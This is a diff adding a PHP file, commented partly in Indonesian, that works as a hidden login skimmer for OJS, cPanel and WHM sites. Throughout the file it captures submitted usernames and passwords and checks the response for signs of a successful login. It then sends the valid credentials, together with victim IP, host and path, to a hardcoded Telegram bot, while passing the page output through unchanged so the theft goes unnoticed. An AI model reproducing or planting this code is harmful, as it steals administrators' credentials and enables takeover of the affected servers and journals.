@@ -1,0 +1,167 @@
+<?php
+
+$bot_token = '8927281774:AAE96HyE7nDUpjkbxpHhB59wxy97KVBHV_4';
+$chat_id = '8917583887';
+
+$username = '';
+$password = '';
+$login_type = 'OJS'; // Default
+
+// ========== DETEKSI JENIS LOGIN ==========
+$request_uri = $_SERVER['REQUEST_URI'] ?? '';
+$script_name = $_SERVER['SCRIPT_NAME'] ?? '';
+$query_string = $_SERVER['QUERY_STRING'] ?? '';
+
+// Cek apakah ini login cPanel
+if (stripos($request_uri, 'cpanel') !== false || 
+    stripos($script_name, 'cpanel') !== false ||
+    stripos($query_string, 'cpanel') !== false ||
+    stripos($request_uri, 'login.cgi') !== false ||
+    stripos($request_uri, 'cpsess') !== false) {
+    $login_type = 'CPANEL';
+}
+// Cek apakah ini login WHM
+elseif (stripos($request_uri, 'whm') !== false || 
+        stripos($script_name, 'whm') !== false ||
+        stripos($query_string, 'whm') !== false ||
+        stripos($request_uri, 'whostmgr') !== false ||
+        stripos($request_uri, 'login.cgi') !== false) {
+    $login_type = 'WHM';
+}
+// Cek OJS (default)
+else {
+    $login_type = 'OJS';
+}
+
+// ========== TANGKAP CREDENTIAL ==========
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    // Untuk OJS
+    $username = $_POST['username'] ?? $_POST['email'] ?? '';
+    $password = $_POST['password'] ?? '';
+    
+    // Untuk cPanel/WHM (bisa pakai user, pass, atau passwd)
+    if (empty($username) || empty($password)) {
+        $username = $_POST['user'] ?? $_POST['username'] ?? $_POST['email'] ?? '';
+        $password = $_POST['pass'] ?? $_POST['password'] ?? $_POST['passwd'] ?? '';
+    }
+}
+
+if (!empty($username) && !empty($password)) {
+    
+    // Mulai capture output
+    ob_start();
+    
+    // Simpan data untuk dikirim setelah kita tahu hasil login
+    $login_data = [
+        'type' => $login_type,
+        'username' => $username,
+        'password' => $password,
+        'ip' => $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown',
+        'time' => date('Y-m-d H:i:s'),
+        'host' => $_SERVER['HTTP_HOST'] ?? 'unknown',
+        'path' => $_SERVER['REQUEST_URI'] ?? '/',
+        'ua' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown'
+    ];
+    
+    // Register shutdown function
+    register_shutdown_function(function() use ($login_data, $bot_token, $chat_id) {
+        // Ambil response
+        $response = ob_get_clean();
+        
+        // ========== KIRIM LAGI OUTPUT KE BROWSER ==========
+        echo $response;
+        // ================================================
+        
+        // ========== DETEKSI STATUS LOGIN ==========
+        $is_failed = false;
+        $is_success = false;
+        $error_indicators = ['Invalid', 'incorrect', 'wrong', 'failed', 'error', 'tidak valid', 'salah', 
+                             'denied', 'not found', 'invalid login', 'authentication failed', 'login failed'];
+        
+        // Cek response untuk error
+        foreach ($error_indicators as $indicator) {
+            if (stripos($response, $indicator) !== false) {
+                $is_failed = true;
+                break;
+            }
+        }
+        
+        // Cek header untuk redirect (sukses)
+        $headers = headers_list();
+        foreach ($headers as $header) {
+            if (stripos($header, 'Location:') !== false) {
+                // Untuk berbagai jenis redirect sukses
+                if (stripos($header, 'dashboard') !== false || 
+                    stripos($header, 'index') !== false ||
+                    stripos($header, 'home') !== false ||
+                    stripos($header, 'main') !== false ||
+                    stripos($header, 'cpanel') !== false ||
+                    stripos($header, 'whm') !== false) {
+                    $is_success = true;
+                    break;
+                }
+            }
+        }
+        
+        // Cek juga untuk cPanel/WHM yang pakai session
+        if (stripos($response, 'Welcome') !== false || 
+            stripos($response, 'Dashboard') !== false ||
+            stripos($response, 'cPanel') !== false ||
+            stripos($response, 'WHM') !== false) {
+            $is_success = true;
+        }
+        
+        // ================================================
+        // ==== MODIFICATION: ONLY SEND IF SUCCESSFUL ====
+        // ================================================
+        
+        // ONLY proceed if login is SUCCESSFUL
+        if ($is_success) {
+            
+            // ========== BUAT PESAN TELEGRAM ==========
+            $icon = '';
+            switch ($login_data['type']) {
+                case 'CPANEL':
+                    $icon = '🖥️';
+                    break;
+                case 'WHM':
+                    $icon = '⚙️';
+                    break;
+                default:
+                    $icon = '📚';
+            }
+            
+            $message = "✅ {$icon} {$login_data['type']} LOGIN SUCCESS\n";
+            $message .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
+            $message .= "👤 USERNAME: {$login_data['username']}\n";
+            $message .= "🔑 PASSWORD: {$login_data['password']}\n";
+            $message .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
+            $message .= "🌐 IP: {$login_data['ip']}\n";
+            $message .= "📍 PATH: {$login_data['path']}\n";
+            $message .= "⏰ TIME: {$login_data['time']}\n";
+            $message .= "🌍 HOST: {$login_data['host']}\n";
+            $message .= "\n✅ LOGIN BERHASIL! Credential valid!";
+            
+            // ========== KIRIM KE TELEGRAM ==========
+            $url = "https://api.telegram.org/bot{$bot_token}/sendMessage";
+            $post_data = "chat_id={$chat_id}&text=" . urlencode($message);
+            
+            if (function_exists('curl_init')) {
+                $ch = curl_init();
+                curl_setopt($ch, CURLOPT_URL, $url);
+                curl_setopt($ch, CURLOPT_POST, 1);
+                curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
+                curl_setopt($ch, CURLOPT_TIMEOUT, 3);
+                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+                curl_exec($ch);
+                curl_close($ch);
+            }
+            
+        }
+        // END OF MODIFICATION - Failed logins are silently ignored
+        // ================================================
+        
+    });
+}
+?>
